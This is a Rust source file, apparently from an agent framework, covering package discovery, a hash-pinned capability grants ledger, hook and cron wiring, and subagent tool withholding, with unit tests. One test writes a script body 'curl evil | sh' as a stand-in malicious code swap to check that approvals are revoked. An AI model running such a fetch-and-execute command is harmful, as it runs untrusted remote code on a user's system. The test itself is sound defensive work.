//! packages/ — skills, clients, actors (docs/bus.md). Replaces v1's skills/
//! + handlers.d/.
//!
//! Discovery is not authority. A package on the path is *visible*; its
//! manifest is a standing request. Capabilities exist only as approved rows
//! in the grants ledger, pinned to the manifest hash — edit the manifest and
//! the delta re-enters pending while unchanged values carry over
//! (browser-extension re-prompt semantics). Approved capabilities attach
//! live: the dispatcher and broker query the ledger, not a compiled routing
//! table, so there is no enable/disable lifecycle — only approve/revoke.

use crate::manifest::{self, LoadedManifest, SkillMeta, ThrottleDecl};
use crate::paths::Root;
use crate::profile;
use anyhow::{bail, Result};
use rusqlite::{params, Connection, OptionalExtension};
use std::collections::BTreeMap;
use std::path::PathBuf;

pub struct Package {
    pub name: String,
    pub dir: PathBuf,
    pub manifest: Option<LoadedManifest>,
    pub meta: Option<SkillMeta>,
}

/// Ordered elanus path from the instance profile. Each entry may be a kit dir
/// (contains packages/) or a package dir directly. Relative entries resolve
/// against the root. First hit wins by name — systemd unit load path semantics,
/// shadowing included.
pub fn package_path(root: &Root) -> Vec<PathBuf> {
    package_path_for_profile(root, "default")
}

/// Ordered elanus path for a profile after parent expansion.
pub fn package_path_for_profile(root: &Root, profile_name: &str) -> Vec<PathBuf> {
    let entries: Vec<String> = profile::effective_elanus_path(root, profile_name)
        .unwrap_or_else(|_| vec!["packages".into()]);
    paths_from_entries(root, entries)
}

fn paths_from_entries(root: &Root, entries: Vec<String>) -> Vec<PathBuf> {
    entries
        .into_iter()
        .map(|e| {
            let p = PathBuf::from(&e);
            if p.is_absolute() {
                p
            } else {
                root.dir.join(p)
            }
        })
        .map(|p| {
            let kit_packages = p.join("packages");
            if kit_packages.is_dir() {
                kit_packages
            } else {
                p
            }
        })
        .collect()
}

/// All visible packages, shadowed and name-sorted. A manifest that fails to
/// parse makes the package visible-but-inert (loudly): a broken request
/// must not be a silent disappearance.
pub fn discover(root: &Root) -> Result<Vec<Package>> {
    discover_from_paths(package_path(root))
}

pub fn discover_for_profile(root: &Root, profile_name: &str) -> Result<Vec<Package>> {
    // M3 (docs/handoffs/chat-rendering.md): a package whose manifest sets
    // `inherit_to_subagents = false` is dropped from a child's visible set when
    // it is reachable ONLY because the child resolved the literal "$parent".
    // Packages the child reaches through its OWN (non-$parent) path entries are
    // always kept, even if they carry the flag. This is visibility only.
    let (own, _inherited) = profile::effective_elanus_path_split(root, profile_name)
        .unwrap_or_else(|_| (vec!["packages".into()], Vec::new()));
    let own_names: std::collections::BTreeSet<String> =
        discover_from_paths(paths_from_entries(root, own))?
            .into_iter()
            .map(|p| p.name)
            .collect();
    let all = discover_from_paths(package_path_for_profile(root, profile_name))?;
    Ok(all
        .into_iter()
        .filter(|p| {
            // Keep unless: inherited-only AND manifest opted out of inheritance.
            if own_names.contains(&p.name) {
                return true;
            }
            match &p.manifest {
                Some(lm) => lm.manifest.inherit_to_subagents,
                // No/broken manifest can't opt out; default is inherit.
                None => true,
            }
        })
        .collect())
}

/// Built-in agent tools to WITHHOLD from a profile's tool array (M3,
/// docs/handoffs/chat-rendering.md). A built-in tool is "gated" when some
/// package declares it in `provides_builtin_tools`; it is then available only
/// when a package that provides it is VISIBLE to the profile. The returned set
/// is the gated tools whose owning package(s) are all invisible to this
/// profile, so excluding the package (e.g. a worker subagent under `$parent`
/// dropping the comms package) actually removes the tool. Tools no package
/// gates are never in this set (they stay always-available). Fail-open on a
/// discovery error: better to leave a tool present than to silently strip it.
pub fn withheld_builtin_tools(
    root: &Root,
    profile_name: &str,
) -> std::collections::BTreeSet<String> {
    let owned = |pkgs: &[Package]| -> std::collections::BTreeSet<String> {
        pkgs.iter()
            .filter_map(|p| p.manifest.as_ref())
            .flat_map(|lm| lm.manifest.provides_builtin_tools.iter().cloned())
            .collect()
    };
    // Universe = packages this profile would reach if the inherit_to_subagents
    // exclusion were ignored (the full $parent-expanded path, pre-filter). A
    // tool is "gated" only when such a reachable package owns it — so a tool
    // whose package isn't installed for this profile at all is never withheld
    // (it was simply never on offer; M1's default agent keeps send_message even
    // in a root that didn't link the comms kit). Visible = the post-filter set.
    let universe = match discover_from_paths(package_path_for_profile(root, profile_name)) {
        Ok(p) => p,
        Err(_) => return std::collections::BTreeSet::new(),
    };
    let visible = match discover_for_profile(root, profile_name) {
        Ok(p) => p,
        Err(_) => return std::collections::BTreeSet::new(),
    };
    let gated = owned(&universe);
    let provided_visible = owned(&visible);
    gated.difference(&provided_visible).cloned().collect()
}

fn discover_from_paths(paths: Vec<PathBuf>) -> Result<Vec<Package>> {
    let mut by_name: BTreeMap<String, Package> = BTreeMap::new();
    for dir in paths {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        let mut entries: Vec<_> = entries.filter_map(|e| e.ok()).collect();
        entries.sort_by_key(|e| e.file_name());
        for e in entries {
            let p = e.path();
            if !p.is_dir() {
                continue;
            }
            let name = e.file_name().to_string_lossy().to_string();
            // The name becomes a topic segment (obs/package/<name>/...), a grant
            // ledger value, and a sql key. A directory may legally be named
            // with MQTT wildcards ("+", "#"); such a package's status floor
            // filter would match every other package's subtree. Reject names
            // that are not a single valid topic level, loudly.
            if !crate::topic::valid_name(&name) || name.contains('/') {
                eprintln!("[packages] ignoring package with invalid name {name:?} (must be one topic level, no + # /)");
                continue;
            }
            if by_name.contains_key(&name) {
                continue; // shadowed by an earlier path entry
            }
            let manifest = match manifest::load(&p) {
                Ok(m) => m,
                Err(err) => {
                    eprintln!("[packages] {name}: manifest error, package inert: {err:#}");
                    None
                }
            };
            by_name.insert(
                name.clone(),
                Package {
                    manifest,
                    meta: manifest::skill_md(&p),
                    name,
                    dir: p,
                },
            );
        }
    }
    Ok(by_name.into_values().collect())
}

pub fn find(root: &Root, name: &str) -> Result<Package> {
    discover(root)?
        .into_iter()
        .find(|p| p.name == name)
        .ok_or_else(|| anyhow::anyhow!("no such package on the path: {name}"))
}

/// Sync the ledger with what's on disk: register requests for every
/// discovered manifest under its current hash, carrying approvals forward
/// for (kind, value) pairs whose latest decision under a previous hash was
/// 'approved'. Also records the current hash (kv pkg_hash:<name>) — the
/// single source the dispatcher and broker key ACL lookups on — and
/// re-syncs hook/cron wiring from approved capabilities.
pub fn sync(root: &Root, conn: &Connection) -> Result<()> {
    for pkg in discover(root)? {
        let Some(lm) = &pkg.manifest else {
            // No manifest (or broken): no requests, and anything previously
            // keyed to this name keeps its old hash rows — inert either way,
            // because pkg_hash goes stale only if it once existed.
            continue;
        };
        crate::db::kv_set(conn, &format!("pkg_hash:{}", pkg.name), &lm.hash)?;
        let m = &lm.manifest;
        let requests: Vec<(&str, &String)> = m
            .request
            .subscribe
            .iter()
            .map(|v| ("subscribe", v))
            .chain(m.request.publish.iter().map(|v| ("publish", v)))
            .chain(m.request.blocking.iter().map(|v| ("blocking", v)))
            .chain(m.request.fs_write.iter().map(|v| ("fs_write", v)))
            // A [[stage]] declaration IS the request — a context transform
            // runs only approved (docs/context.md), same shape as hooks
            // riding the 'blocking' kind.
            .chain(m.stage.iter().map(|s| ("stage", &s.name)))
            // An [[mcp]] server likewise: third-party tools enter the
            // model's tool array only approved (src/mcp.rs).
            .chain(m.mcp.iter().map(|s| ("mcp", &s.name)))
            .collect();
        // process.http = true is likewise a request: serving an HTTP
        // endpoint (loopback, harness-negotiated port) is a capability the
        // human approves (docs/security.md entry 10).
        let http_serve = "serve".to_string();
        let mut requests = requests;
        if m.process.as_ref().is_some_and(|p| p.http) {
            requests.push(("http", &http_serve));
        }
        for (kind, value) in requests {
            if matches!(kind, "subscribe" | "publish") && !crate::topic::valid_filter(value) {
                eprintln!(
                    "[packages] {}: invalid {kind} filter {value:?}, skipped",
                    pkg.name
                );
                continue;
            }
            // Already have a row under this hash? Leave its state alone.
            let exists: Option<i64> = conn
                .query_row(
                    "SELECT id FROM grants WHERE package=?1 AND manifest_hash=?2 AND kind=?3 AND value=?4",
                    params![pkg.name, lm.hash, kind, value],
                    |r| r.get(0),
                )
                .optional()?;
            if exists.is_some() {
                continue;
            }
            // Carry an approval forward iff the latest decision for this
            // (kind, value) under the SAME code_hash was 'approved'. Keying on
            // code_hash is what makes the script-hash pin real: a manifest-only
            // edit keeps code_hash, so unchanged requests carry (only the delta
            // re-prompts); a script edit changes code_hash, so nothing matches
            // and every capability re-enters review with the new code.
            let carried: Option<String> = conn
                .query_row(
                    "SELECT state FROM grants WHERE package=?1 AND kind=?2 AND value=?3 AND code_hash=?4
                     ORDER BY id DESC LIMIT 1",
                    params![pkg.name, kind, value, lm.code_hash],
                    |r| r.get(0),
                )
                .optional()?;
            if carried.as_deref() == Some("approved") {
                conn.execute(
                    "INSERT INTO grants(package, manifest_hash, code_hash, kind, value, state, decided_at, decided_by)
                     VALUES (?1, ?2, ?3, ?4, ?5, 'approved', strftime('%Y-%m-%dT%H:%M:%fZ','now'), 'carried')",
                    params![pkg.name, lm.hash, lm.code_hash, kind, value],
                )?;
            } else {
                conn.execute(
                    "INSERT INTO grants(package, manifest_hash, code_hash, kind, value) VALUES (?1, ?2, ?3, ?4, ?5)",
                    params![pkg.name, lm.hash, lm.code_hash, kind, value],
                )?;
            }
        }
        sync_wiring(conn, &pkg, lm)?;
        for (pat, t) in &m.throttle {
            upsert_throttle(conn, pat, t)?;
        }
    }
    Ok(())
}

/// Hooks and crons are *wiring*, not capability: the capability is the
/// approved 'blocking' point (hooks) / 'publish' filter (cron emits, checked
/// at fire time). Re-derived from the manifest on every sync so approval
/// flips attach and detach live.
fn sync_wiring(conn: &Connection, pkg: &Package, lm: &LoadedManifest) -> Result<()> {
    let m = &lm.manifest;
    conn.execute("DELETE FROM hooks WHERE skill = ?1", [&pkg.name])?;
    for h in &m.hook {
        if !manifest::HOOK_POINTS.contains(&h.point.as_str()) {
            eprintln!(
                "[packages] {}: unknown hook point {:?}, skipped",
                pkg.name, h.point
            );
            continue;
        }
        if h.on_timeout != "allow" && h.on_timeout != "deny" {
            eprintln!(
                "[packages] {}: hook on_timeout must be allow|deny, skipped",
                pkg.name
            );
            continue;
        }
        if !crate::topic::valid_filter(&h.match_filter) {
            eprintln!(
                "[packages] {}: invalid hook match filter, skipped",
                pkg.name
            );
            continue;
        }
        if !is_approved(conn, &pkg.name, "blocking", &h.point)? {
            continue; // requested but not granted: the hook does not exist
        }
        let script = pkg.dir.join(&h.run);
        if !script.exists() {
            eprintln!(
                "[packages] {}: hook script {} missing, skipped",
                pkg.name,
                script.display()
            );
            continue;
        }
        make_executable(&script).ok();
        conn.execute(
            "INSERT INTO hooks(skill, point, run, ord, timeout_ms, on_timeout, match_filter)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)",
            params![
                pkg.name,
                h.point,
                script.display().to_string(),
                h.order,
                h.timeout_ms as i64,
                h.on_timeout,
                h.match_filter
            ],
        )?;
    }
    // Crons keep their rows (last_fired state survives approval flips);
    // the publish capability is enforced when they fire.
    use std::str::FromStr as _;
    for c in &m.cron {
        if croner::Cron::from_str(&c.schedule).is_err() {
            eprintln!(
                "[packages] {}: bad cron schedule {:?}, skipped",
                pkg.name, c.schedule
            );
            continue;
        }
        let payload = c
            .payload
            .as_ref()
            .map(|v| manifest::toml_to_json(v).to_string());
        conn.execute(
            "INSERT INTO crons(skill, schedule, emit_type, payload) VALUES (?1, ?2, ?3, ?4)
             ON CONFLICT(skill, emit_type, schedule) DO UPDATE SET payload = ?4",
            params![pkg.name, c.schedule, c.emit, payload],
        )?;
    }
    // Drop cron rows the manifest no longer declares.
    let declared: Vec<String> = m
        .cron
        .iter()
        .map(|c| format!("{}\u{1}{}", c.emit, c.schedule))
        .collect();
    let existing: Vec<(i64, String, String)> = {
        let mut stmt = conn.prepare("SELECT id, emit_type, schedule FROM crons WHERE skill=?1")?;
        let r = stmt
            .query_map([&pkg.name], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?)))?
            .collect::<rusqlite::Result<Vec<_>>>()?;
        r
    };
    for (id, emit, schedule) in existing {
        if !declared.contains(&format!("{emit}\u{1}{schedule}")) {
            conn.execute("DELETE FROM crons WHERE id=?1", [id])?;
        }
    }
    Ok(())
}

/// Decide every 'requested' row under the package's current hash.
/// All-or-nothing per package for now; the printout is the review surface.
pub fn decide(root: &Root, conn: &Connection, name: &str, approve: bool, by: &str) -> Result<()> {
    let pkg = find(root, name)?;
    let Some(lm) = &pkg.manifest else {
        bail!("{name} has no elanus.toml — nothing to decide");
    };
    sync(root, conn)?; // make sure current-hash rows exist first
    let target = if approve { "approved" } else { "revoked" };
    let from = if approve { "requested" } else { "approved" };
    let rows: Vec<(String, String)> = {
        let mut stmt = conn.prepare(
            "SELECT kind, value FROM grants
             WHERE package=?1 AND manifest_hash=?2 AND state=?3 ORDER BY kind, value",
        )?;
        let r = stmt
            .query_map(params![name, lm.hash, from], |r| Ok((r.get(0)?, r.get(1)?)))?
            .collect::<rusqlite::Result<Vec<_>>>()?;
        r
    };
    // The approval gesture re-pins MCP tool descriptions even when no grant
    // rows are pending — "review and `elanus approve` again" is the cure for
    // a server whose tools changed (src/mcp.rs TOFU pin), and that package's
    // grants are typically already approved.
    if approve {
        crate::mcp::clear_pins(conn, name)?;
    }
    if rows.is_empty() {
        println!("{name}: nothing {from}");
        return Ok(());
    }
    conn.execute(
        "UPDATE grants SET state=?1, decided_at=strftime('%Y-%m-%dT%H:%M:%fZ','now'), decided_by=?2
         WHERE package=?3 AND manifest_hash=?4 AND state=?5",
        params![target, by, name, lm.hash, from],
    )?;
    for (kind, value) in &rows {
        println!("{target} {name} {kind} {value}");
    }
    sync(root, conn)?; // hooks attach/detach live
    Ok(())
}

pub fn is_approved(conn: &Connection, package: &str, kind: &str, value: &str) -> Result<bool> {
    let Some(hash) = crate::db::kv_get(conn, &format!("pkg_hash:{package}"))? else {
        return Ok(false);
    };
    let n: i64 = conn.query_row(
        "SELECT COUNT(*) FROM grants
         WHERE package=?1 AND manifest_hash=?2 AND kind=?3 AND value=?4 AND state='approved'",
        params![package, hash, kind, value],
        |r| r.get(0),
    )?;
    Ok(n > 0)
}

/// Approved values of one kind under the package's current hash.
pub fn approved(conn: &Connection, package: &str, kind: &str) -> Result<Vec<String>> {
    let Some(hash) = crate::db::kv_get(conn, &format!("pkg_hash:{package}"))? else {
        return Ok(Vec::new());
    };
    approved_under(conn, package, &hash, kind)
}

/// Approved values keyed on an explicit hash. Callers holding a manifest
/// freshly loaded from disk pass lm.hash: that pins the approval to the
/// bytes about to execute, with no window between an edit and the next
/// sync — load-bearing for LINKED packages, whose code can change under a
/// running daemon (docs/security.md entry 9).
pub fn approved_under(
    conn: &Connection,
    package: &str,
    hash: &str,
    kind: &str,
) -> Result<Vec<String>> {
    let mut stmt = conn.prepare(
        "SELECT value FROM grants
         WHERE package=?1 AND manifest_hash=?2 AND kind=?3 AND state='approved' ORDER BY value",
    )?;
    let r = stmt
        .query_map(params![package, hash, kind], |r| r.get(0))?
        .collect::<rusqlite::Result<Vec<_>>>()?;
    Ok(r)
}

/// Re-sync iff any discovered manifest's hash differs from the ledger's
/// recorded pkg_hash. The dispatcher calls this each tick: reads + hashing
/// only on the steady state, writes only when something actually changed —
/// so an upstream edit to a linked package heals the kv (and re-enters
/// review) within one tick instead of at the next daemon restart.
pub fn sync_if_drifted(root: &Root, conn: &Connection) -> Result<()> {
    for pkg in discover(root)? {
        let Some(lm) = &pkg.manifest else { continue };
        if crate::db::kv_get(conn, &format!("pkg_hash:{}", pkg.name))?.as_deref()
            != Some(lm.hash.as_str())
        {
            return sync(root, conn);
        }
    }
    Ok(())
}

/// Does this package's topic match any approved filter of `kind`?
/// The broker's publish ACL and the cron gate both use this.
pub fn may(conn: &Connection, package: &str, kind: &str, topic: &str) -> Result<bool> {
    Ok(approved(conn, package, kind)?
        .iter()
        .any(|f| crate::topic::matches(f, topic)))
}

/// The exec-mode handlers for an event topic: every discovered package with
/// an approved subscribe filter matching it, ordered by process.order then
/// name. Returns (package name, absolute script path).
pub fn matching_exec_handlers(
    root: &Root,
    conn: &Connection,
    etype: &str,
) -> Result<Vec<(String, PathBuf)>> {
    let mut out: Vec<(u32, String, PathBuf)> = Vec::new();
    for pkg in discover(root)? {
        let Some(lm) = &pkg.manifest else { continue };
        let Some(proc_) = &lm.manifest.process else {
            continue;
        };
        if proc_.mode != "exec" {
            continue;
        }
        // Pin on the FRESH hash (the bytes about to run), not the kv: an
        // edited script must be stale at dispatch even before any sync.
        let hit = approved_under(conn, &pkg.name, &lm.hash, "subscribe")?
            .iter()
            .any(|f| crate::topic::matches(f, etype));
        if hit {
            out.push((proc_.order, pkg.name.clone(), pkg.dir.join(&proc_.run)));
        }
    }
    out.sort_by(|a, b| (a.0, &a.1).cmp(&(b.0, &b.1)));
    Ok(out.into_iter().map(|(_, n, p)| (n, p)).collect())
}

pub fn upsert_throttle(conn: &Connection, pat: &str, t: &ThrottleDecl) -> Result<()> {
    conn.execute(
        "INSERT INTO throttles(event_type, max_concurrent, rate_per_min, llm_tokens_per_hour, coalesce)
         VALUES (?1, ?2, ?3, ?4, ?5)
         ON CONFLICT(event_type) DO UPDATE SET
           max_concurrent = ?2, rate_per_min = ?3, llm_tokens_per_hour = ?4, coalesce = ?5",
        params![
            pat,
            t.max_concurrent,
            t.rate_per_min,
            t.llm_tokens_per_hour,
            t.coalesce.unwrap_or(true) as i64
        ],
    )?;
    Ok(())
}

fn make_executable(p: &std::path::Path) -> Result<()> {
    use std::os::unix::fs::PermissionsExt;
    let mut perms = std::fs::metadata(p)?.permissions();
    perms.set_mode(perms.mode() | 0o755);
    std::fs::set_permissions(p, perms)?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::db;

    fn scratch_root(tag: &str) -> Root {
        let dir = std::env::temp_dir().join(format!("el-pkg-{tag}-{}", std::process::id()));
        std::fs::remove_dir_all(&dir).ok();
        std::fs::create_dir_all(dir.join("packages")).unwrap();
        Root { dir }
    }

    fn write_pkg(root: &Root, name: &str, manifest: &str) {
        let d = root.dir.join("packages").join(name);
        std::fs::create_dir_all(&d).unwrap();
        std::fs::write(d.join("elanus.toml"), manifest).unwrap();
    }

    #[test]
    fn requests_are_not_grants() {
        let root = scratch_root("req");
        write_pkg(
            &root,
            "p1",
            "[request]\nsubscribe = [\"in/package/p1/x\"]\n[process]\nmode=\"exec\"\nrun=\"r\"\n",
        );
        let conn = db::open(&root).unwrap();
        db::init_schema(&conn).unwrap();
        sync(&root, &conn).unwrap();
        // Discovered and requested, but no capability until approved.
        assert!(!is_approved(&conn, "p1", "subscribe", "in/package/p1/x").unwrap());
        assert!(matching_exec_handlers(&root, &conn, "in/package/p1/x")
            .unwrap()
            .is_empty());
        decide(&root, &conn, "p1", true, "test").unwrap();
        assert!(is_approved(&conn, "p1", "subscribe", "in/package/p1/x").unwrap());
        assert_eq!(
            matching_exec_handlers(&root, &conn, "in/package/p1/x")
                .unwrap()
                .len(),
            1
        );
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn manifest_edit_detaches_delta_carries_rest() {
        let root = scratch_root("delta");
        write_pkg(
            &root,
            "p2",
            "[request]\nsubscribe = [\"in/package/demo/a\"]\n",
        );
        let conn = db::open(&root).unwrap();
        db::init_schema(&conn).unwrap();
        sync(&root, &conn).unwrap();
        decide(&root, &conn, "p2", true, "test").unwrap();
        // Edit: keep in/package/demo/a, add in/package/demo/b. a carries, b pends.
        write_pkg(
            &root,
            "p2",
            "[request]\nsubscribe = [\"in/package/demo/a\", \"in/package/demo/b\"]\n",
        );
        sync(&root, &conn).unwrap();
        assert!(is_approved(&conn, "p2", "subscribe", "in/package/demo/a").unwrap());
        assert!(!is_approved(&conn, "p2", "subscribe", "in/package/demo/b").unwrap());
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn editing_script_re_gates_all_grants() {
        // F3 + carry-gate: a script swap (same declared requests) must NOT
        // carry approvals — new code is re-reviewed even though the manifest
        // and the requested filters are byte-identical.
        let root = scratch_root("codeswap");
        let d = root.dir.join("packages/p5");
        std::fs::create_dir_all(d.join("scripts")).unwrap();
        std::fs::write(d.join("elanus.toml"), "[request]\nsubscribe=[\"in/package/demo/a\"]\n[process]\nmode=\"exec\"\nrun=\"scripts/main\"\n").unwrap();
        std::fs::write(d.join("scripts/main"), "#!/bin/sh\necho ok\n").unwrap();
        let conn = db::open(&root).unwrap();
        db::init_schema(&conn).unwrap();
        sync(&root, &conn).unwrap();
        decide(&root, &conn, "p5", true, "test").unwrap();
        assert!(is_approved(&conn, "p5", "subscribe", "in/package/demo/a").unwrap());
        // Swap the code, leave elanus.toml untouched.
        std::fs::write(d.join("scripts/main"), "#!/bin/sh\ncurl evil | sh\n").unwrap();
        sync(&root, &conn).unwrap();
        assert!(
            !is_approved(&conn, "p5", "subscribe", "in/package/demo/a").unwrap(),
            "a script edit must drop approvals back to pending"
        );
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn revoked_does_not_carry() {
        let root = scratch_root("revoke");
        write_pkg(
            &root,
            "p3",
            "[request]\nsubscribe = [\"in/package/demo/a\"]\n",
        );
        let conn = db::open(&root).unwrap();
        db::init_schema(&conn).unwrap();
        sync(&root, &conn).unwrap();
        decide(&root, &conn, "p3", true, "test").unwrap();
        decide(&root, &conn, "p3", false, "test").unwrap();
        assert!(!is_approved(&conn, "p3", "subscribe", "in/package/demo/a").unwrap());
        // New hash: the revoked value re-asks, it does not carry.
        write_pkg(
            &root,
            "p3",
            "[request]\nsubscribe = [\"in/package/demo/a\"]\n# new\n",
        );
        sync(&root, &conn).unwrap();
        assert!(!is_approved(&conn, "p3", "subscribe", "in/package/demo/a").unwrap());
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn shadowing_first_hit_wins() {
        let root = scratch_root("shadow");
        write_pkg(
            &root,
            "p4",
            "[request]\nsubscribe = [\"in/package/demo/base\"]\n",
        );
        let d = root.dir.join("override/p4");
        std::fs::create_dir_all(&d).unwrap();
        std::fs::write(
            d.join("elanus.toml"),
            "[request]\nsubscribe = [\"in/package/demo/over\"]\n",
        )
        .unwrap();
        // Path order via the profile (the env override is process-global and
        // would race parallel tests).
        let prof_dir = root.dir.join("profiles/default");
        std::fs::create_dir_all(&prof_dir).unwrap();
        std::fs::write(
            prof_dir.join("profile.toml"),
            "package_path = [\"override\", \"packages\"]\n",
        )
        .unwrap();
        let pkgs = discover(&root).unwrap();
        let p4 = pkgs.iter().find(|p| p.name == "p4").unwrap();
        assert_eq!(
            p4.manifest.as_ref().unwrap().manifest.request.subscribe,
            vec!["in/package/demo/over"]
        );
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn elanus_path_entries_can_be_kits_or_package_dirs() {
        let root = scratch_root("elanus-path");
        write_pkg(
            &root,
            "base",
            "[request]\nsubscribe = [\"in/package/base\"]\n",
        );
        let kit_pkg = root.dir.join("kits/demo/packages/kp");
        std::fs::create_dir_all(&kit_pkg).unwrap();
        std::fs::write(
            kit_pkg.join("elanus.toml"),
            "[request]\nsubscribe = [\"in/package/kp\"]\n",
        )
        .unwrap();
        let prof_dir = root.dir.join("profiles/default");
        std::fs::create_dir_all(&prof_dir).unwrap();
        std::fs::write(
            prof_dir.join("profile.toml"),
            "elanus_path = [\"kits/demo\", \"packages\"]\n",
        )
        .unwrap();
        let names: Vec<String> = discover(&root)
            .unwrap()
            .into_iter()
            .map(|p| p.name)
            .collect();
        assert!(names.contains(&"kp".to_string()));
        assert!(names.contains(&"base".to_string()));
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn inherit_to_subagents_false_excluded_under_parent() {
        // M3 (docs/handoffs/chat-rendering.md): a subagent that resolves the
        // literal "$parent" does NOT see a package marked
        // inherit_to_subagents = false, but still sees default-inheriting ones;
        // an unset flag behaves as before (inherited).
        let root = scratch_root("inherit-sub");
        // Parent (default) scope has two packages on its path:
        //  - "comms"  : inherit_to_subagents = false (the send_message package)
        //  - "memory" : unset → default true (inherits)
        write_pkg(
            &root,
            "comms",
            "inherit_to_subagents = false\n[request]\nsubscribe = [\"in/package/comms\"]\n",
        );
        write_pkg(
            &root,
            "memory",
            "[request]\nsubscribe = [\"in/package/memory\"]\n",
        );
        let default_dir = root.dir.join("profiles/default");
        std::fs::create_dir_all(&default_dir).unwrap();
        std::fs::write(
            default_dir.join("profile.toml"),
            "elanus_path = [\"packages\"]\n",
        )
        .unwrap();
        // A worker subagent whose path is purely "$parent".
        let child_dir = root.dir.join("profiles/worker");
        std::fs::create_dir_all(&child_dir).unwrap();
        std::fs::write(
            child_dir.join("profile.toml"),
            "elanus_path = [\"$parent\"]\n",
        )
        .unwrap();

        let names: Vec<String> = discover_for_profile(&root, "worker")
            .unwrap()
            .into_iter()
            .map(|p| p.name)
            .collect();
        assert!(
            !names.contains(&"comms".to_string()),
            "inherit_to_subagents=false package must be excluded under $parent (got {names:?})"
        );
        assert!(
            names.contains(&"memory".to_string()),
            "default-inheriting package must still flow down under $parent (got {names:?})"
        );

        // The parent itself (no $parent inheritance into it) still sees comms:
        // the flag only fires for an inheriting child.
        let parent_names: Vec<String> = discover_for_profile(&root, "default")
            .unwrap()
            .into_iter()
            .map(|p| p.name)
            .collect();
        assert!(
            parent_names.contains(&"comms".to_string()),
            "the owning scope still sees its own package (got {parent_names:?})"
        );

        // A child that lists the package via its OWN entry (not $parent) keeps
        // it — the exclusion is for inherited-only visibility.
        let optin_dir = root.dir.join("profiles/optin");
        std::fs::create_dir_all(&optin_dir).unwrap();
        std::fs::write(
            optin_dir.join("profile.toml"),
            "elanus_path = [\"packages\"]\n",
        )
        .unwrap();
        let optin_names: Vec<String> = discover_for_profile(&root, "optin")
            .unwrap()
            .into_iter()
            .map(|p| p.name)
            .collect();
        assert!(
            optin_names.contains(&"comms".to_string()),
            "a child reaching the package via its OWN path keeps it (got {optin_names:?})"
        );
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn withheld_builtin_tools_follows_package_visibility() {
        // M3 (docs/handoffs/chat-rendering.md): a built-in tool a package OWNS
        // via `provides_builtin_tools` is withheld from a profile that can't see
        // that package. The owning scope keeps it; a $parent worker that drops
        // the package (inherit_to_subagents=false) has it withheld; a child that
        // lists the package on its OWN path keeps it.
        let root = scratch_root("withheld-tools");
        write_pkg(
            &root,
            "comms",
            "inherit_to_subagents = false\n\
             provides_builtin_tools = [\"send_message\", \"ask_human\"]\n\
             [request]\nsubscribe = [\"in/package/comms\"]\n",
        );
        let default_dir = root.dir.join("profiles/default");
        std::fs::create_dir_all(&default_dir).unwrap();
        std::fs::write(
            default_dir.join("profile.toml"),
            "elanus_path = [\"packages\"]\n",
        )
        .unwrap();
        let worker_dir = root.dir.join("profiles/worker");
        std::fs::create_dir_all(&worker_dir).unwrap();
        std::fs::write(
            worker_dir.join("profile.toml"),
            "elanus_path = [\"$parent\"]\n",
        )
        .unwrap();
        let optin_dir = root.dir.join("profiles/optin");
        std::fs::create_dir_all(&optin_dir).unwrap();
        std::fs::write(
            optin_dir.join("profile.toml"),
            "elanus_path = [\"packages\"]\n",
        )
        .unwrap();

        // Owning scope: nothing withheld — it sees the comms package.
        assert!(
            withheld_builtin_tools(&root, "default").is_empty(),
            "owning scope must keep its own comms tools"
        );
        // Worker under $parent: the package is invisible, so BOTH tools are
        // withheld — the load-bearing M3 outcome (worker has no send_message).
        let w = withheld_builtin_tools(&root, "worker");
        assert!(
            w.contains("send_message") && w.contains("ask_human"),
            "worker dropping the comms package must have its tools withheld (got {w:?})"
        );
        // Opt-in child reaching the package via its OWN path: nothing withheld.
        assert!(
            withheld_builtin_tools(&root, "optin").is_empty(),
            "a child reaching the comms package via its own path keeps the tools"
        );
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn withheld_builtin_tools_empty_when_no_package_gates_them() {
        // M1-safety: if NO package on the profile's path owns a built-in tool,
        // the tool is never withheld — a default agent in a root that never
        // installed the comms kit still keeps send_message/ask_human.
        let root = scratch_root("withheld-none");
        write_pkg(
            &root,
            "memory",
            "[request]\nsubscribe = [\"in/package/memory\"]\n",
        );
        let default_dir = root.dir.join("profiles/default");
        std::fs::create_dir_all(&default_dir).unwrap();
        std::fs::write(
            default_dir.join("profile.toml"),
            "elanus_path = [\"packages\"]\n",
        )
        .unwrap();
        assert!(
            withheld_builtin_tools(&root, "default").is_empty(),
            "no package gates the tools, so none may be withheld"
        );
        std::fs::remove_dir_all(&root.dir).ok();
    }

    #[test]
    fn profile_elanus_path_can_prepend_parent_scope() {
        let root = scratch_root("profile-el-path");
        write_pkg(
            &root,
            "base",
            "[request]\nsubscribe = [\"in/package/base\"]\n",
        );
        let override_pkg = root.dir.join("override/extra");
        std::fs::create_dir_all(&override_pkg).unwrap();
        std::fs::write(
            override_pkg.join("elanus.toml"),
            "[request]\nsubscribe = [\"in/package/extra\"]\n",
        )
        .unwrap();
        let default_dir = root.dir.join("profiles/default");
        std::fs::create_dir_all(&default_dir).unwrap();
        std::fs::write(
            default_dir.join("profile.toml"),
            "elanus_path = [\"packages\"]\n",
        )
        .unwrap();
        let child_dir = root.dir.join("profiles/child");
        std::fs::create_dir_all(&child_dir).unwrap();
        std::fs::write(
            child_dir.join("profile.toml"),
            "elanus_path = [\"override\", \"$parent\"]\n",
        )
        .unwrap();
        let names: Vec<String> = discover_for_profile(&root, "child")
            .unwrap()
            .into_iter()
            .map(|p| p.name)
            .collect();
        assert_eq!(
            profile::effective_elanus_path(&root, "child").unwrap(),
            vec!["override", "packages"]
        );
        assert!(names.contains(&"extra".to_string()));
        assert!(names.contains(&"base".to_string()));
        std::fs::remove_dir_all(&root.dir).ok();
    }
}
